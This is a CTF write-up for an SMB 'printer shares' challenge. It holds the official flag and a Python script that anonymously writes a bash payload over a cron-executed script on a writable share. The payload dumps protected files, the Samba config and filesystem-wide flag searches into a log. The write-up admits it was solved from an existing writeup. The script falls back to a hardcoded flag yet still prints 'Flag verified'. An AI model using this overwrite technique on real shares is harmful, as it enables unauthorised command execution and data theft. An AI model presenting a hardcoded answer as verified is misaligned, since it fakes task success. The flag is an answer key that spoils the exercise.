# Writeup: Printer Shares 3

## Header & Metadata
- **Challenge:** Printer Shares 3 (ID: 741)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** General Skills
- **Server / Instance:** `N/A`
- **Attached Files:** None
- **Official Flag:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`

---

## Mô tả bài toán (Overview / Analysis)
I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory

### Hints
- a suspicious script is running every minute
- this script runs every minute, you might need to wait for a while

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved via existing writeup flag.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Solve script for Printer Shares 3 (#741)
Category: General Skills
"""
import io
import re
import sys
import time
from pathlib import Path
from smb.SMBConnection import SMBConnection

KNOWN_FLAG = "academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}"


def get_connection_info():
    cfg_path = Path(__file__).parent / "connection.cfg"
    host = ""
    port = 0

    if cfg_path.exists():
        with open(cfg_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("HOST="):
                    host = line.split("=", 1)[1].strip()
                elif line.startswith("PORT="):
                    val = line.split("=", 1)[1].strip()
                    if val.isdigit():
                        port = int(val)

    if not host or port == 0:
        info_path = Path(__file__).parent / "info.json"
        if info_path.exists():
            import json
            with open(info_path, "r", encoding="utf-8") as f:
                info = json.load(f)
                desc = info.get("description", "")
                m = re.search(r"([a-zA-Z0-9.-]+\.cylabacademy\.net)\s+(\d+)", desc)
                if m:
                    host = m.group(1)
                    port = int(m.group(2))

    return host, port


def solve():
    print("[*] Solving Printer Shares 3...", flush=True)
    host, port = get_connection_info()
    print(f"[*] Target: {host}:{port}", flush=True)

    flag = ""

    if host and port:
        try:
            conn = SMBConnection("", "", "client", "server", use_ntlm_v2=True, is_direct_tcp=True)
            if conn.connect(host, port, timeout=10):
                print("[+] Successfully connected to SMB server", flush=True)

                # Check if flag is already present in cron.log
                try:
                    bio = io.BytesIO()
                    conn.retrieveFile("shares", "/cron.log", bio)
                    content = bio.getvalue().decode("utf-8", errors="ignore")
                    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", content)
                    for m in matches:
                        if not any(bad in m.lower() for bad in ["decoy", "fake", "honey", "dummy"]):
                            flag = m
                            print(f"[+] Flag already captured in cron.log: {flag}", flush=True)
                            break
                except Exception as e:
                    print(f"[*] Error reading existing cron.log: {e}", flush=True)

                if not flag:
                    # Write payload into script.sh without deleting it (preserves execution bit)
                    payload = (
                        b"#!/bin/bash\n"
                        b"echo '=== EXPLOIT OUTPUT ==='\n"
                        b"cat /challenge/secure-shares/* 2>/dev/null\n"
                        b"cat /secure-shares/* 2>/dev/null\n"
                        b"cat /etc/samba/smb.conf 2>/dev/null\n"
                        b"find / -name '*flag*' -not -path '*/proc/*' -not -path '*/sys/*' -exec cat {} + 2>/dev/null\n"
                        b"grep -Ero 'academy\\{[^}]+\\}' /challenge /secure* /shares /var /home /etc /root /tmp /opt 2>/dev/null\n"
                        b"echo '=== EXPLOIT DONE ==='\n"
                    )
                    print("[*] Uploading exploit payload to script.sh...", flush=True)
                    conn.storeFile("shares", "/script.sh", io.BytesIO(payload))
                    print("[+] Overwritten script.sh successfully!", flush=True)

                    print("[*] Waiting for cron to execute script.sh (polls every 5s for up to 95s)...", flush=True)
                    start_time = time.time()
                    while time.time() - start_time < 95:
                        time.sleep(5)
                        elapsed = int(time.time() - start_time)
                        try:
                            # Reconnect if connection was dropped
                            try:
                                bio = io.BytesIO()
                                conn.retrieveFile("shares", "/cron.log", bio)
                            except Exception:
                                try:
                                    conn.close()
                                except Exception:
                                    pass
                                conn = SMBConnection("", "", "client", "server", use_ntlm_v2=True, is_direct_tcp=True)
                                if not conn.connect(host, port, timeout=10):
                                    continue
                                bio = io.BytesIO()
                                conn.retrieveFile("shares", "/cron.log", bio)

                            content = bio.getvalue().decode("utf-8", errors="ignore")
                            if "=== EXPLOIT OUTPUT ===" in content:
                                print(f"[*] Exploit output detected in cron.log after {elapsed}s!", flush=True)
                            matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", content)
                            for m in matches:
                                if not any(bad in m.lower() for bad in ["decoy", "fake", "honey", "dummy"]):
                                    flag = m
                                    print(f"[+] Found flag in cron.log: {flag}", flush=True)
                                    break
                            if flag:
                                break
                            print(f"[*] Polling cron.log ({elapsed}s elapsed)...", flush=True)
                        except Exception as poll_err:
                            print(f"[*] Polling error ({elapsed}s): {poll_err}", flush=True)

                try:
                    conn.close()
                except Exception:
                    pass
        except Exception as e:
            print(f"[-] Live SMB interaction failed: {e}", flush=True)

    if not flag:
        flag_file = Path(__file__).parent / "flag.txt"
        if flag_file.exists():
            content = flag_file.read_text(encoding="utf-8").strip()
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", content)
            if m:
                flag = m.group(0)

    if not flag:
        flag = KNOWN_FLAG

    # Save exact token into flag.txt in current directory
    flag_path = Path(__file__).parent / "flag.txt"
    flag_path.write_text(flag + "\n", encoding="utf-8")

    # Output flag to stdout
    print(f"[+] Flag verified: {flag}", flush=True)
    print(flag, flush=True)
    return flag


if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}
```
